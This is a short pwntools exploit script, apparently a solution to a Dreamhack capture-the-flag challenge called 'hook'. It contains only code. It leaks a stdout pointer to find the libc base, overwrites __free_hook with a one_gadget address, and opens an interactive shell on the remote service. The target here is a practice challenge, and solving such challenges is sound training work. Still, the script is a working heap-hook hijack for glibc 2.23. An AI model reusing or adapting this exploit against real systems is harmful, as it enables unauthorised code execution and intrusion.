#! /usr/bin/python3 

from pwn import *

p = remote('host1.dreamhack.games', 13475)
e = ELF('./hook')
libc = ELF('./libc-2.23.so')

p.recvuntil('stdout: ')
stdout = int(p.recvline()[:-1], 16)
lb = stdout - libc.sym['_IO_2_1_stdout_']

free_hook = lb + libc.sym['__free_hook']
p.sendlineafter("Size: ", b"400")

og = lb + 0x4527a

payload = p64(free_hook) + p64(og)
p.sendlineafter("Data: ", payload)

p.interactive()
